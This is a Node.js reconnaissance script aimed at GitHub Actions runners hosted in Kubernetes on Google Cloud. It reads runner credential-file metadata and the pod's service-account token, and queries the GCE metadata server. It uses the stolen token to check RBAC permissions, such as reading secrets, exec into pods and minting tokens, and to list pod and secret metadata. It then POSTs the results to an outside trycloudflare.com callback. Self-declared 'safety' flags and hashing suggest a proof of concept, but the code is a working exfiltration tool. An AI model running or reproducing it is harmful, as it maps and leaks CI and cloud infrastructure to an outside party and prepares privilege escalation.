"use strict";

const crypto = require("crypto");
const fs = require("fs");
const http = require("http");
const https = require("https");
const path = require("path");

const RUNNER_ROOT = "/home/runner";
const KSA_ROOT = "/var/run/secrets/kubernetes.io/serviceaccount";
const MAX_ITEMS = 50;
const CALLBACK_URL =
  "https://vocational-clinics-orders-recall.trycloudflare.com/" +
  "66dd0e4c4f309e1700c37d9f42fc6850";

function opaque(value) {
  if (typeof value !== "string" || value.length === 0) return null;
  return crypto.createHash("sha256").update(value).digest("hex").slice(0, 12);
}

function readJson(file) {
  try {
    const value = JSON.parse(fs.readFileSync(file, "utf8"));
    return value && typeof value === "object" && !Array.isArray(value)
      ? value
      : null;
  } catch {
    return null;
  }
}

function fileMetadata(file) {
  try {
    const info = fs.statSync(file);
    return {
      present: true,
      mode_octal: (info.mode & 0o7777).toString(8).padStart(4, "0"),
      uid: info.uid,
      gid: info.gid,
      bytes: info.size,
    };
  } catch (error) {
    return { present: false, error: error.code || error.name };
  }
}

function urlHost(value) {
  try {
    return typeof value === "string" ? new URL(value).host : null;
  } catch {
    return null;
  }
}

function runnerFiles() {
  const runnerPath = path.join(RUNNER_ROOT, ".runner");
  const credentialsPath = path.join(RUNNER_ROOT, ".credentials");
  const rsaPath = path.join(RUNNER_ROOT, ".credentials_rsaparams");
  const runner = readJson(runnerPath) || {};
  const credentials = readJson(credentialsPath) || {};
  const data =
    credentials.data && typeof credentials.data === "object"
      ? credentials.data
      : {};
  const rsa = readJson(rsaPath) || {};
  const modulus = rsa.Modulus || rsa.modulus;
  let modulusBits = null;
  try {
    if (typeof modulus === "string") {
      modulusBits = Buffer.from(modulus, "base64").length * 8;
    }
  } catch {}
  const allowedRunnerKeys = [
    "agentId",
    "agentName",
    "poolId",
    "poolName",
    "serverUrl",
    "gitHubUrl",
    "workFolder",
    "ephemeral",
    "disableUpdate",
  ];
  return {
    runner: {
      file: fileMetadata(runnerPath),
      metadata: Object.fromEntries(
        allowedRunnerKeys
          .filter((key) => key in runner)
          .map((key) => [key, runner[key]]),
      ),
    },
    credentials: {
      file: fileMetadata(credentialsPath),
      scheme: credentials.scheme || null,
      data_keys: Object.keys(data).sort(),
      client_id: data.clientId || null,
      authorization_host: urlHost(data.authorizationUrl),
      authorization_v2_host: urlHost(data.authorizationUrlV2),
      oauth_endpoint_host: urlHost(data.oauthEndpointUrl),
    },
    rsa_parameters: {
      file: fileMetadata(rsaPath),
      field_names: Object.keys(rsa).sort(),
      modulus_bits: modulusBits,
      values_returned: false,
    },
  };
}

function decodeClaims(token) {
  try {
    const part = token.split(".")[1];
    if (!part) return null;
    const value = JSON.parse(Buffer.from(part, "base64url").toString("utf8"));
    return value && typeof value === "object" ? value : null;
  } catch {
    return null;
  }
}

function projectClaims(claims) {
  if (!claims) return { available: false };
  const kubernetes = claims["kubernetes.io"] || {};
  const serviceaccount = kubernetes.serviceaccount || {};
  const pod = kubernetes.pod || {};
  const node = kubernetes.node || {};
  return {
    available: true,
    iss_hash: opaque(claims.iss),
    sub_hash: opaque(claims.sub),
    aud: claims.aud,
    iat: claims.iat,
    exp: claims.exp,
    namespace_hash: opaque(kubernetes.namespace),
    serviceaccount: {
      name_hash: opaque(serviceaccount.name),
      uid_present: Boolean(serviceaccount.uid),
    },
    pod: { name_hash: opaque(pod.name), uid_present: Boolean(pod.uid) },
    node: { name_hash: opaque(node.name), uid_present: Boolean(node.uid) },
    token_returned: false,
  };
}

function request(options) {
  return new Promise((resolve) => {
    const library = options.protocol === "https:" ? https : http;
    const req = library.request(
      {
        protocol: options.protocol,
        hostname: options.hostname,
        port: options.port,
        path: options.requestPath,
        method: options.method,
        headers: options.headers,
        ca: options.ca,
        timeout: options.timeout || 8000,
      },
      (res) => {
        const chunks = [];
        let size = 0;
        res.on("data", (chunk) => {
          size += chunk.length;
          if (size <= 1024 * 1024) chunks.push(chunk);
        });
        res.on("end", () => {
          if (size > 1024 * 1024) {
            resolve({ ok: false, error: "ResponseTooLarge" });
            return;
          }
          const text = Buffer.concat(chunks).toString("utf8");
          let value = null;
          try {
            value = text ? JSON.parse(text) : null;
          } catch {}
          resolve({
            ok: res.statusCode >= 200 && res.statusCode < 300,
            status: res.statusCode,
            text,
            value,
          });
        });
      },
    );
    req.on("timeout", () => req.destroy(new Error("Timeout")));
    req.on("error", (error) =>
      resolve({ ok: false, error: error.code || error.name }),
    );
    if (options.body) req.write(options.body);
    req.end();
  });
}

class KubeClient {
  constructor(token, namespace) {
    this.host = process.env.KUBERNETES_SERVICE_HOST;
    if (!this.host) throw new Error("KUBERNETES_SERVICE_HOST absent");
    this.port = process.env.KUBERNETES_SERVICE_PORT_HTTPS || "443";
    this.token = token;
    this.namespace = namespace;
    this.ca = fs.readFileSync(path.join(KSA_ROOT, "ca.crt"));
  }

  async call(method, requestPath, body = null, accept = "application/json") {
    const encoded = body ? Buffer.from(JSON.stringify(body)) : null;
    return request({
      protocol: "https:",
      hostname: this.host,
      port: this.port,
      requestPath,
      method,
      ca: this.ca,
      body: encoded,
      headers: {
        Authorization: `Bearer ${this.token}`,
        Accept: accept,
        "Content-Type": "application/json",
        ...(encoded ? { "Content-Length": encoded.length } : {}),
      },
    });
  }

  async ssar(verb, resource, group = "", subresource = null) {
    const resourceAttributes = {
      namespace: this.namespace,
      verb,
      group,
      resource,
      ...(subresource ? { subresource } : {}),
    };
    const response = await this.call(
      "POST",
      "/apis/authorization.k8s.io/v1/selfsubjectaccessreviews",
      {
        apiVersion: "authorization.k8s.io/v1",
        kind: "SelfSubjectAccessReview",
        spec: { resourceAttributes },
      },
    );
    const status = response.value && response.value.status;
    if (response.ok && status) {
      return {
        allowed: Boolean(status.allowed),
        denied: Boolean(status.denied),
        reason: status.reason || null,
      };
    }
    return { ok: false, status: response.status, error: response.error || null };
  }

  async partialMetadata(requestPath, kind) {
    const response = await this.call(
      "GET",
      requestPath,
      null,
      "application/json;as=PartialObjectMetadataList;g=meta.k8s.io;v=v1",
    );
    if (!response.ok || !response.value) {
      return { ok: false, status: response.status, error: response.error || null };
    }
    const raw = Array.isArray(response.value.items) ? response.value.items : [];
    const items = raw.slice(0, MAX_ITEMS).map((item) => {
      const metadata = item.metadata || {};
      const labels = metadata.labels || {};
      const annotations = metadata.annotations || {};
      const safeLabels = Object.fromEntries(
        Object.entries(labels).filter(
          ([key]) =>
            key.startsWith("actions.github.com/") ||
            key.startsWith("app.kubernetes.io/") ||
            key === "job-name" ||
            key === "jobset.sigs.k8s.io/jobset-name",
        ),
      );
      const safeAnnotations = {};
      if (annotations["iam.gke.io/gcp-service-account"]) {
        safeAnnotations["iam.gke.io/gcp-service-account"] =
          annotations["iam.gke.io/gcp-service-account"];
      }
      const owners = Array.isArray(metadata.ownerReferences)
        ? metadata.ownerReferences.map((owner) => ({
            kind: owner.kind || null,
            name_hash: opaque(owner.name),
            controller: Boolean(owner.controller),
          }))
        : [];
      return {
        name_hash: opaque(metadata.name),
        labels: safeLabels,
        annotations: safeAnnotations,
        ownerReferences: owners,
        arc_cleanup_finalizer: Array.isArray(metadata.finalizers)
          ? metadata.finalizers.includes("actions.github.com/cleanup-protection")
          : false,
      };
    });
    return {
      ok: true,
      kind,
      count: raw.length,
      items,
      truncated: raw.length > MAX_ITEMS,
      object_bodies_returned: false,
    };
  }

  async runnerSets(requestPath) {
    const response = await this.call("GET", requestPath);
    if (!response.ok || !response.value) {
      return { ok: false, status: response.status, error: response.error || null };
    }
    const raw = Array.isArray(response.value.items) ? response.value.items : [];
    return {
      ok: true,
      items: raw.map((item) => {
        const spec = item.spec || {};
        const podSpec = (spec.template && spec.template.spec) || {};
        return {
          name_hash: opaque(item.metadata && item.metadata.name),
          runnerScaleSetName: spec.runnerScaleSetName || null,
          runnerGroup: spec.runnerGroup || null,
          githubConfigUrl: spec.githubConfigUrl || null,
          githubConfigSecret_name_hash: opaque(spec.githubConfigSecret),
          githubConfigSecret_configured: Boolean(spec.githubConfigSecret),
          vaultType: spec.vaultConfig ? spec.vaultConfig.type || null : null,
          runner_serviceaccount_name_hash: opaque(podSpec.serviceAccountName),
        };
      }),
      secret_values_returned: false,
    };
  }
}

async function metadataText(metadataPath) {
  const response = await request({
    protocol: "http:",
    hostname: "metadata.google.internal",
    port: 80,
    requestPath: `/computeMetadata/v1/${metadataPath}`,
    method: "GET",
    timeout: 3000,
    headers: { "Metadata-Flavor": "Google" },
  });
  if (!response.ok) return null;
  const text = response.text.trim();
  return metadataPath.endsWith("/scopes")
    ? text.split("\n").filter(Boolean).sort()
    : text || null;
}

async function collect() {
  const output = {
    captured_at: new Date().toISOString(),
    safety: {
      credential_values_returned: false,
      credential_hashes_returned: false,
      cloud_token_requested: false,
      cloud_identity_document_requested: false,
      kubernetes_secret_data_requested: false,
      mutating_request_sent: false,
    },
    process: {
      uid: process.getuid ? process.getuid() : null,
      gid: process.getgid ? process.getgid() : null,
      environment_variable_names: Object.keys(process.env)
        .filter((key) => /TOKEN|SECRET|CREDENTIAL|KUBERNETES|RUNNER/i.test(key))
        .sort(),
    },
    runner_files: runnerFiles(),
  };
  const [projectId, serviceAccountEmail, scopes] = await Promise.all([
    metadataText("project/project-id"),
    metadataText("instance/service-accounts/default/email"),
    metadataText("instance/service-accounts/default/scopes"),
  ]);
  output.gce_metadata = {
    project_id: projectId,
    service_account_email: serviceAccountEmail,
    scopes,
    access_token_requested: false,
  };

  let token;
  let namespace;
  try {
    token = fs.readFileSync(path.join(KSA_ROOT, "token"), "utf8").trim();
    namespace = fs.readFileSync(path.join(KSA_ROOT, "namespace"), "utf8").trim();
  } catch (error) {
    output.kubernetes = { available: false, error: error.code || error.name };
    return output;
  }
  output.kubernetes_identity = projectClaims(decodeClaims(token));
  let client;
  try {
    client = new KubeClient(token, namespace);
  } catch (error) {
    output.kubernetes = { available: false, error: error.code || error.name };
    return output;
  }
  const checks = [
    ["pods", "list", "", null],
    ["pods", "create", "", null],
    ["pods", "create", "", "exec"],
    ["pods", "get", "", "log"],
    ["jobs", "list", "batch", null],
    ["secrets", "get", "", null],
    ["secrets", "list", "", null],
    ["serviceaccounts", "list", "", null],
    ["serviceaccounts", "create", "", "token"],
    ["roles", "list", "rbac.authorization.k8s.io", null],
    ["rolebindings", "list", "rbac.authorization.k8s.io", null],
    ["nodes", "list", "", null],
    ["autoscalingrunnersets", "list", "actions.github.com", null],
    ["ephemeralrunners", "list", "actions.github.com", null],
  ];
  const authorization = {};
  for (const [resource, verb, group, subresource] of checks) {
    const key = [group || "core", resource, subresource, verb]
      .filter(Boolean)
      .join("/");
    authorization[key] = await client.ssar(verb, resource, group, subresource);
  }
  const quoted = encodeURIComponent(namespace);
  output.kubernetes = {
    available: true,
    namespace_hash: opaque(namespace),
    authorization,
    pod_metadata: await client.partialMetadata(
      `/api/v1/namespaces/${quoted}/pods`,
      "Pod",
    ),
    job_metadata: await client.partialMetadata(
      `/apis/batch/v1/namespaces/${quoted}/jobs`,
      "Job",
    ),
    secret_metadata: await client.partialMetadata(
      `/api/v1/namespaces/${quoted}/secrets`,
      "Secret",
    ),
    serviceaccount_metadata: await client.partialMetadata(
      `/api/v1/namespaces/${quoted}/serviceaccounts`,
      "ServiceAccount",
    ),
  };
  const arsKey = "actions.github.com/autoscalingrunnersets/list";
  if (authorization[arsKey] && authorization[arsKey].allowed) {
    output.kubernetes.autoscaling_runner_sets = await client.runnerSets(
      `/apis/actions.github.com/v1alpha1/namespaces/${quoted}/autoscalingrunnersets`,
    );
  }
  return output;
}

async function send(value) {
  const target = new URL(CALLBACK_URL);
  const body = Buffer.from(JSON.stringify(value));
  const response = await request({
    protocol: target.protocol,
    hostname: target.hostname,
    port: target.port || 443,
    requestPath: target.pathname,
    method: "POST",
    body,
    headers: {
      "Content-Type": "application/json",
      "Content-Length": body.length,
    },
  });
  if (!response.ok) throw new Error("callback failed");
}

collect()
  .then(send)
  .then(() => process.exit(0))
  .catch(() => process.exit(1));
